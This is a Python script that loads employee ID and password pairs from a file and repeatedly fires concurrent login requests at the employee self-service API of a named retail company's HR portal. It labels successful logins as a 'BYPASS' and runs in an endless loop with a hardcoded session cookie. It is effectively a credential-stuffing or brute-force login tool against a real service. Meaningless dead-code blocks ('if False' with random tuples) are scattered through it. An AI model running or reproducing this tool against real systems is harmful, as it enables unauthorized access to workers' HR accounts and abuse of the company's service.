import asyncio
import aiohttp
import time

async def login(session, nik, password):
    headers = {'Host': 'api.hrindomaret.com', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'Origin': 'https://ess-online.hrindomaret.com', 'Referer': 'https://ess-online.hrindomaret.com/', 'Cookie': 'laravel_session=eyJpdiI6Ilp5TEV2R3ZUYmhKQWg2NnVoRGhTQlE9PSIsInZhbHVlIjoiSUxPcjRFRTdcL2kzb1NEU0ZNQUxDdWhoK1ZiNUxlekdLcmorMk1XM01ZUkd2K2RLQmZlR1IzWGZrWXUzYityWjYiLCJtYWMiOiI2OTU4Y2E1MGYyNTM1MjEyNTBlNTQ3ZWIxOWMwYjdmNzlhMTc4NmM5N2E1ZDAzYTZjZGViYzQzYmJlYzBkOTE5In0%3D'}
    if False:
        _var_68_0 = (418, 262, 957)
        _var_68_1 = (777, 488, 104)
        _var_68_2 = (914, 404, 405)

        def _var_68_fn():
            pass
    data = {'Data': {'nik': nik, 'pass': password}}
    try:
        async with session.post('https://api.hrindomaret.com/api/ESS/Login', json=data, headers=headers) as response:
            response.raise_for_status()
            if response.status == 200:
                print(f'\n[INFO] BYPASS untuk NIK {nik} SUKSES')
                print(await response.json())
            else:
                print(f'\n[ERROR] Login gagal untuk NIK {nik}. Kode kesalahan: {response.status}')
                print(f'        Pesan: {await response.text()}\n')
    except aiohttp.ClientError as e:
        print(f'[ERROR] Terjadi kesalahan pada request: {e}\n')

async def login_multiple(nik_password_pairs, jumlah_periksa):
    async with aiohttp.ClientSession() as session:
        for i in range(jumlah_periksa):
            print(f'\n[INFO] BYPASS KE -{i + 1}')
            start_time = time.time()
            tasks = [login(session, nik, password) for (nik, password) in nik_password_pairs]
            await asyncio.gather(*tasks)
            print(f'[INFO] Waktu yang dibutuhkan: {time.time() - start_time:.2f} detik\n')
    if False:
        _var_69_0 = (334, 234, 609)
        _var_69_1 = (678, 631, 146)
        _var_69_2 = (881, 585, 710)

        def _var_69_fn():
            pass

def main():
    nik_password_pairs = []
    if False:
        _var_70_0 = (267, 16, 462)
        _var_70_1 = (597, 460, 779)
        _var_70_2 = (474, 918, 547)

        def _var_70_fn():
            pass
    with open('password.txt', 'r') as file:
        for line in file:
            (nik, password) = line.strip().split(',')
            nik_password_pairs.append((nik, password))
    try:
        jumlah_periksa = int(input('BYPASS BERAPA KALI? : '))
    except ValueError:
        print('[ERROR] Input tidak valid. Masukkan angka.')
        return
    while True:
        asyncio.run(login_multiple(nik_password_pairs, jumlah_periksa))
if False:
    _var_71_0 = (962, 104, 429)
    _var_71_1 = (555, 661, 178)
    _var_71_2 = (775, 298, 175)

    def _var_71_fn():
        pass
if __name__ == '__main__':
    main()